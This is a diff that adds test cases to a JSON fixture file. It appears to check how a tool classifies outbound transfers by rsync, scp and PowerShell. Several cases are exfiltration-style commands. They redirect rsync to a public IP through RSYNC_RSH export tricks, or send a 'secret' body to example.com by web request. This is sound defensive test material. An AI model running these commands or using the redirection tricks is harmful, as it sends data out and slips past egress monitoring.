@@ -6706,6 +6706,433 @@
      }
     ]
    }
+  },
+  {
+   "command": "set -a; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -ea; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -o allexport; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -eo pipefail; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "10.0.4.12",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -a; set +o allexport; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "10.0.4.12",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -a; set +a; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "10.0.4.12",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "(set -a); RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "10.0.4.12",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "{ set -a; }; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -a | cat; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "10.0.4.12",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "false && set -a; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "10.0.4.12",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "setopt allexport; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "prod",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -o all_export; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "prod",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -a; declare RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "8.8.8.8",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "set -a; for RSYNC_RSH in 'ssh -o HostName=8.8.8.8'; do rsync -a build.zip prod:/srv; done",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "prod",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "export RSYNC_RSH=ssh; for RSYNC_RSH in 'ssh -o HostName=8.8.8.8'; do rsync -a build.zip prod:/srv; done",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "prod",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "for RSYNC_RSH in 'ssh -o HostName=8.8.8.8'; do rsync -a build.zip prod:/srv; done",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "10.0.4.12",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "eval \"$X\"; export -n RSYNC_RSH; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "prod",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "export -n RSYNC_RSH; RSYNC_RSH=\"ssh -o HostName=8.8.8.8\"; rsync -a build.zip prod:/srv",
+   "transfer": {
+    "tool": "rsync",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "prod",
+      "resolved_host": "10.0.4.12",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "scp -F '~/cfg' build.zip example.com:/srv",
+   "transfer": {
+    "tool": "scp",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "scp -F '~/cfg' build.zip 10.1.2.3:/srv",
+   "transfer": {
+    "tool": "scp",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "10.1.2.3",
+      "resolved_host": "10.1.2.3",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "pwsh -c 'iwr https://example.com/up -NoProxy:$false -Body secret'",
+   "env": {
+    "HTTPS_PROXY": "http://proxy.corp:3128"
+   },
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "pwsh -c 'iwr https://example.com/up -NoProxy:$False -Body secret'",
+   "env": {
+    "HTTPS_PROXY": "http://proxy.corp:3128"
+   },
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "pwsh -c 'iwr https://example.com/up -NoProxy:0 -Body secret'",
+   "env": {
+    "HTTPS_PROXY": "http://proxy.corp:3128"
+   },
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "pwsh -c 'iwr https://example.com/up -NoProxy: $false -Body secret'",
+   "env": {
+    "HTTPS_PROXY": "http://proxy.corp:3128"
+   },
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "unresolved"
+     }
+    ]
+   }
+  },
+  {
+   "command": "pwsh -c 'iwr https://example.com/up -NoProxy:$true -Body secret'",
+   "env": {
+    "HTTPS_PROXY": "http://proxy.corp:3128"
+   },
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "pwsh -c 'iwr https://example.com/up -NoProxy -Body secret'",
+   "env": {
+    "HTTPS_PROXY": "http://proxy.corp:3128"
+   },
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "pwsh -c 'iwr -Uri: https://example.com/up -Body secret'",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "pwsh -c 'iwr https://example.com/up -NoProxy: $true -Body secret'",
+   "env": {
+    "HTTPS_PROXY": "http://proxy.corp:3128"
+   },
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "pwsh -c 'iwr https://example.com/a -Method: POST'",
+   "transfer": {
+    "tool": "powershell",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
   }
  ]
 }
